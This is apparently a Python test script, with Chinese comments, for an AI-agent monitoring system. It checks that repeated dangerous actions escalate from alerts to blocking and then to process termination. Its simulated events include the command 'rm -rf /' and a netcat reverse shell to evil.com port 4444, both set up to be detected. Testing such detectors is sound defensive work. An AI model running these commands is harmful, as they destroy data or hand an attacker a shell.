#!/usr/bin/env python3
"""
verify_tier3_escalation.py — Tier2/Tier3 阻断链验证脚本

验证目标:
1. Tier1 违规累计 → Tier2 升级 → BlockAccessHandler 执行
2. Tier2 违规累计 → Tier3 升级 → HardInterruptHandler 执行
3. 已终止 Agent 的后续事件被丢弃
4. 反向管道指令正确发送 (ALLOW / BLOCK_EVENT / TERMINATE_PROCESS)

运行方式:
    python3 observer_sim/tests/verify_tier3_escalation.py

输出:
    - 每个检查点的 ✅/❌ 结果
    - 汇总通过/失败计数
"""

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from models.event import RawEvent, NormalizedEvent
from models.virtual_clock import VirtualClock
from models.risk import (
    RiskAssessment, RiskLevel, Decision, DecisionAction, ActionTier, BlockingResult
)
from observer_core.blocking.blocking_coordinator import BlockingCoordinator
from observer_core.blocking.command_sender import MockCommandSender
from models.command import CmdType

# ── 测试辅助函数 ──────────────────────────────────────────────────

def make_event(event_id: str, event_type: str, agent_id: str,
              executable: str = None, arguments: list = None,
              file_path: str = None, file_op: str = None,
              remote_addr: str = None, remote_port: int = None,
              clock: VirtualClock = None) -> NormalizedEvent:
    """创建测试用 NormalizedEvent"""
    if clock:
        clock.advance(100)  # +100ms
        ts = clock.now_ns()
    else:
        ts = 1718092800000000000

    raw = RawEvent(
        event_id=event_id,
        timestamp_ns=ts,
        event_type=event_type,
        pid=60001,
        ppid=60000,
        agent_id=agent_id,
        agent_framework="test",
        executable=executable,
        arguments=arguments or [],
        file_path=file_path,
        file_op=file_op,
        remote_addr=remote_addr,
        remote_port=remote_port or 0,
    )
    return NormalizedEvent(raw=raw)


def make_decision(action: DecisionAction, tier: ActionTier,
                  reason: str = "") -> Decision:
    """创建测试用 Decision"""
    return Decision(
        action=action,
        tier=tier,
        reason=reason or f"test: {action.value} @ {tier.value}"
    )


# ── 主测试 ────────────────────────────────────────────────────────

def main():
    passed = 0
    failed = 0

    def check(name: str, condition: bool, detail: str = ""):
        nonlocal passed, failed
        if condition:
            print(f"  ✅ {name}")
            passed += 1
        else:
            print(f"  ❌ {name}  — {detail}")
            failed += 1

    print("=" * 60)
    print("Tier2/Tier3 阻断链验证")
    print("=" * 60)

    # ── Phase 1: Tier1 累计 → Tier2 升级 ──────────────────────────
    print("\n── Phase 1: Tier1×5 → Tier2 升级 ──")

    clock = VirtualClock(start_ns=1718092800000000000)
    sender = MockCommandSender()
    sender.connect("test_pipe")
    coordinator = BlockingCoordinator(clock=clock, sender=sender)

    agent_id = "escalation-test-agent"
    tier1_count = 0

    for i in range(6):
        event = make_event(f"evt_0{i}", "exec", agent_id,
                          executable="/bin/rm", arguments=["-rf", "/"],
                          clock=clock)
        decision = make_decision(DecisionAction.ALERT, ActionTier.TIER1,
                                f"dangerous command #{i+1}")
        result = coordinator.execute(event, decision)

        if i < 4:
            # 前 4 次: 应保持在 TIER1
            check(f"事件{i+1}: TIER1 未升级",
                  result.tier == ActionTier.TIER1 and not result.blocked,
                  f"tier={result.tier.value} blocked={result.blocked}")
            tier1_count += 1
        elif i == 4:
            # 第 5 次: 应升级到 TIER2
            check(f"事件{i+1}: TIER1→TIER2 升级",
                  result.tier == ActionTier.TIER2 and result.blocked,
                  f"tier={result.tier.value} blocked={result.blocked}")
        else:
            # 第 6 次: 保持 TIER2
            check(f"事件{i+1}: 维持 TIER2",
                  result.tier == ActionTier.TIER2 and result.blocked,
                  f"tier={result.tier.value} blocked={result.blocked}")

    # 验证违规计数
    violations = coordinator.tracker.get_violation_count(agent_id)
    check(f"违规计数={violations} (预期 6)", violations == 6,
          f"实际={violations}")

    # 验证 CommandSender 收到了 BLOCK_EVENT 指令
    tier2_blocks = [c for c in sender.sent_commands
                   if c.cmd_type == CmdType.BLOCK_EVENT.value]
    check(f"BLOCK_EVENT 指令数={len(tier2_blocks)} (预期 2)",
          len(tier2_blocks) == 2,
          f"实际={len(tier2_blocks)}")

    # ── Phase 2: Tier2 累计 → Tier3 升级 ──────────────────────────
    print("\n── Phase 2: Tier2×3 → Tier3 升级 (终止) ──")

    # 注意：当前 violation_tracker 中所有违规都记录为 TIER1，
    # tier2_count 始终为 0。因此 Tier2→Tier3 升级路径在当前代码中不可达。
    # 这里通过直接传入 TIER2 决策来绕过此限制进行验证。

    # 重置 tracker 和 sender 以开始全新 Tier2→Tier3 升级链
    coordinator.tracker.reset()
    sender.clear()

    agent_id2 = "tier3-escalation-agent"

    for i in range(4):
        event = make_event(f"evt_t3_{i:02d}", "exec", agent_id2,
                          executable="/usr/bin/nc",
                          arguments=["-e", "/bin/sh", "evil.com", "4444"],
                          clock=clock)
        # 直接传入 TIER2 决策（模拟 DecisionEngine 在 HIGH 风险下的输出）
        decision = make_decision(DecisionAction.BLOCK, ActionTier.TIER2,
                                f"reverse shell attempt #{i+1}")
        result = coordinator.execute(event, decision)

        if i < 2:
            check(f"Tier2 事件{i+1}: 未升级到 Tier3",
                  result.tier == ActionTier.TIER2,
                  f"tier={result.tier.value} blocked={result.blocked}")
        elif i == 2:
            # 第 3 次 TIER2 → 升级到 TIER3
            check(f"Tier2 事件{i+1}: 升级到 TIER3 (终止)",
                  result.tier == ActionTier.TIER3 and result.blocked,
                  f"tier={result.tier.value} blocked={result.blocked}")
        else:
            # 第 4 次: Agent 已终止，事件被丢弃
            check(f"Tier2 事件{i+1}: Agent 已终止 → 丢弃",
                  result.tier == ActionTier.TIER3 and result.blocked,
                  f"tier={result.tier.value} blocked={result.blocked}")

    # 验证 Agent 被标记为 terminated
    check("Agent 已标记为 terminated",
          coordinator.tracker.is_terminated(agent_id2),
          "Agent 未被标记")

    # ── Phase 3: 已终止 Agent 的 ALLOW 事件被丢弃 ─────────────────
    print("\n── Phase 3: 已终止 Agent 后续事件丢弃 ──")

    benign_event = make_event("evt_benign", "file_open", agent_id2,
                             file_path="/tmp/test.txt", file_op="read",
                             clock=clock)
    benign_decision = make_decision(DecisionAction.ALLOW, ActionTier.TIER1,
                                   "benign file read")
    result = coordinator.execute(benign_event, benign_decision)

    check("已终止 Agent 的 ALLOW 事件被丢弃",
          result.blocked and result.tier == ActionTier.TIER3,
          f"blocked={result.blocked} tier={result.tier.value}")

    # ── Phase 4: 验证反向管道指令 ──────────────────────────────────
    print("\n── Phase 4: 反向管道指令验证 ──")

    all_commands = sender.sent_commands
    cmd_types = {}

    for cmd in all_commands:
        ct = cmd.cmd_type
        cmd_types[ct] = cmd_types.get(ct, 0) + 1

    print(f"  指令统计: {cmd_types}")

    check("存在 BLOCK_EVENT 指令",
          CmdType.BLOCK_EVENT.value in cmd_types,
          "未找到 BLOCK_EVENT")

    check("存在 TERMINATE_PROCESS 指令",
          CmdType.TERMINATE_PROCESS.value in cmd_types,
          "未找到 TERMINATE_PROCESS")

    # 验证 TERMINATE_PROCESS 指令的 target_pid
    term_cmds = [c for c in all_commands
                 if c.cmd_type == CmdType.TERMINATE_PROCESS.value]
    if term_cmds:
        check(f"TERMINATE_PROCESS 包含 target_pid={term_cmds[0].target_pid}",
              term_cmds[0].target_pid is not None and term_cmds[0].target_pid > 0,
              "target_pid 缺失")

    # ── Phase 5: 阻断统计 ─────────────────────────────────────────
    print("\n── Phase 5: 阻断统计 ──")

    stats = coordinator.get_statistics()
    print(f"  统计: {stats}")

    check(f"总阻断事件数={stats['total']} (预期 9)",
          stats['total'] == 9,
          f"实际={stats['total']}")

    check(f"Tier2 事件数={stats['tier2']} (预期 4)",
          stats['tier2'] == 4,
          f"实际={stats['tier2']}")

    check(f"Tier3 事件数={stats['tier3']} (预期 1)",
          stats['tier3'] == 1,
          f"实际={stats['tier3']}")

    # ── 汇总 ──────────────────────────────────────────────────────
    print("\n" + "=" * 60)
    total = passed + failed
    print(f"结果: {passed}/{total} 通过" + (", 全部通过 ✅" if failed == 0 else f", {failed} 失败 ❌"))
    print("=" * 60)

    return 0 if failed == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
